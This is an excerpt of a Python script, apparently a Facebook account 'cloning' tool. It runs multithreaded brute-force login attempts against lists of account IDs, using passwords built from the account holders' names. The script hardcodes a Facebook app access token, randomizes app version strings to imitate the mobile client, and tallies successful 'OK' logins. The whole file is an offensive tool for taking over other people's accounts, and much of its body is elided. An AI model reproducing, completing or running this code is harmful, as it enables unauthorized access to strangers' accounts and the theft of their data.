#!/usr/bin/python3
#-*-coding:utf-8-*-
#Recoded by Younis john (YASEENKHAN)
#Designed by Younis john (YASEENKHAN)
...
try:
	...
	os.system("clear");print("\n\t join crazy Boyz ðŸ¥µðŸ”¥");time.sleep(1)
...
def YASEEN():
			...
			prints(Panel(f"{P2}[{R2}01{P2}]. File cloning\n{P2}[{R2}02{P2}]. Random cloning\n{P2}[{R2}03{P2}]. Gmail cloning  \n{P2}[{R2}04{P2}]. join whatsap group",title=f"{M2}â€¢ {K2}â€¢ {H2}â€¢{P2} MENU {H2}â€¢ {K2}â€¢ {M2}â€¢",width=80,padding=(0,4),style=f"#FFFFFF"))
			...
			if xd in ['1','01']:
				...
				with tred(max_workers=30) as crack_submit:
					...
					pornhub = []
					tol = Console()
					pornhub.append(Panel(f"{P2}Total ids: {H2} {total_ids}\n{P2}Brute has been started",title=f"{M2}â€¢ {K2}â€¢ {H2}â€¢{P2} INFO {H2}â€¢ {K2}â€¢ {M2}â€¢",width=39,padding=(0,2),style=f"#FFFFFF"))
...
def pak():
		...
		with tred(max_workers=30) as XYZ:	
			...
			pornhubxyz = []
			prints(Panel(f"{M2}DONOT USE ANOTHER APPS WHILE PROCESS",width=80,padding=(0,1),style=f"#FFFFFF"))
			pornhubxyz.append(Panel(f"{P2}Total ids: {H2} {tl}\n{P2}Choice code: {H2}{code}{P2}\nBrute has been started",title=f"{M2}â€¢ {K2}â€¢ {H2}â€¢{P2} INFO {H2}â€¢ {K2}â€¢ {M2}â€¢",width=39,padding=(0,2),style=f"#FFFFFF"))
...
def gmail():
		...
		pornhub = []
		tol = Console()
		pornhub.append(Panel(f"{P2}@gmail.com\n@yahoo.com\n@hotmail.com",title=f"{M2}â€¢ {K2}â€¢ {H2}â€¢{P2} DOMAIN EXP {H2}â€¢ {K2}â€¢ {M2}â€¢",width=39,padding=(0,2),style=f"#FFFFFF"))
		tol.print(Columns(pornhub))
...
def api1(ids,names,passlist):
		try:
			...
			sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M1\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
...
def api2(ids,names,passlist):
        try:
                ...
                YounisXyz = random.choice([H,M,K,B])
                global oks,loop,sim_id
                sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M2\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api3(ids,names,passlist):
        try:
                global oks,loop,sim_id
                YounisXyz = random.choice([H,M,K,B])
                sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M3\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
        try:
                global oks,loop,sim_id
                YounisXyz = random.choice([H,M,K,B])
                sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M4\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api5(ids,names,passlist):
        try:
                global oks,loop,sim_id
                YounisXyz = random.choice([H,M,K,B])
                sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M5\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	YounisXyz = random.choice([H,M,K,B])
	sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M6\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
...
def api7(ids,names,passlist):
	global loop,oks,cps
	YounisXyz = random.choice([H,M,K,B])
	sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M7\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	YounisXyz = random.choice([H,M,K,B])
	sys.stdout.write(f'\r\r\033[0;97m [{OK}XYZ-M8\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def xyz4(ids,passlist):
        ...
        global oks
        YounisXyz = random.choice([H,M,K,B])
        sys.stdout.write(f'\r\r\033[0;97m [{OK}YASEEN-M4\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def xyz5(ids,passlist):
        ...
        global oks
        YounisXyz = random.choice([H,M,K,B])
        sys.stdout.write(f'\r\r\033[0;97m [{OK}YASEEN-M5\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def xyz6(ids,passlist):
	...
	try:
		for pas in passlist:
			YounisXyz = random.choice([H,M,K,B])
			sys.stdout.write(f'\r\r\033[0;97m [{OK}YASEEN-M6\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
